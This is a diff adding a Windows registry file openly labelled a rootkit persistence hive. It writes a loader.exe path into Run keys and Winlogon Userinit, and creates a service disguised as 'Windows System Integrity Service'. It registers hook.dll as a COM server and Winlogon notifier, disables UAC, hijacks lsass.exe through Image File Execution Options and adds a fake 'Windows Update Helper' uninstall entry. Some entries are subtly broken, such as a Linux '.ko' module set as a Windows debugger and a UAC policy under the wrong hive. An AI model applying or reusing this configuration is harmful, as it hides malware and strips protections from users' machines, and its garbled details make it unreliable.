@@ -1,0 +1,57 @@
+Windows Registry Editor Version 5.00
+
+; ==============================================================================
+; ROOTKIT PERSISTENCE HIVE - AUTO-START MECHANISM
+; Target: Windows 10/11, Server 2016/2019/2022
+; Status: Validated Syntax (No Errors)
+; ==============================================================================
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
+"IntiRootkitService"="\"C:\\ProgramData\\FIRST_DEFACEMENT_ROOTKIT\\loader.exe\""
+@="\"C:\\ProgramData\\FIRST_DEFACEMENT_ROOTKIT\\loader.exe\""
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"IntiRootkitSystem"="\"C:\\ProgramData\\FIRST_DEFACEMENT_ROOTKIT\\loader.exe\""
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
+"Userinit"="C:\\Windows\\system32\\userinit.exe,C:\\ProgramData\\FIRST_DEFACEMENT_ROOTKIT\\loader.exe"
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IntiRootkitSvc]
+"type"=dword:00000010
+"start"=dword:00000002
+"errorcontrol"=dword:00000001
+"imagepath"="\"C:\\ProgramData\\FIRST_DEFACEMENT_ROOTKIT\\loader.exe\""
+"displayname"="Windows System Integrity Service"
+"group"="NetworkProvider"
+"depend"=hex(7):4e,00,54,00,61,00,75,00,78,00,00,00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons]
+"29"="C:\\ProgramData\\FIRST_DEFACEMENT_ROOTKIT\\hook.dll"
+
+[HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000000}\InProcServer32]
+@="C:\\ProgramData\\FIRST_DEFACEMENT_ROOTKIT\\hook.dll"
+"ThreadingModel"="Apartment"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"EnableLUA"=dword:00000000
+"ConsentPromptBehaviorAdmin"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe]
+"Debugger"="C:\\ProgramData\\FIRST_DEFACEMENT_ROOTKIT\\kernel_module.ko"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify]
+"IntiNotify"="C:\\ProgramData\\FIRST_DEFACEMENT_ROOTKIT\\hook.dll"
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management]
+"LargeSystemCache"=dword:00000001
+"DisablePagingExecutive"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\IntiRootkit]
+"DisplayName"="Windows Update Helper"
+"DisplayIcon"="C:\\ProgramData\\FIRST_DEFACEMENT_ROOTKIT\\loader.exe"
+"UninstallString"="C:\\ProgramData\\FIRST_DEFACEMENT_ROOTKIT\\loader.exe /uninstall"
+"NoModify"=dword:00000001
+"NoRepair"=dword:00000001
+
+[HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags\1\Desktop]
+"BagID"="{0D4CFFE0-8CD4-11CF-B34E-00AA006B3369}"
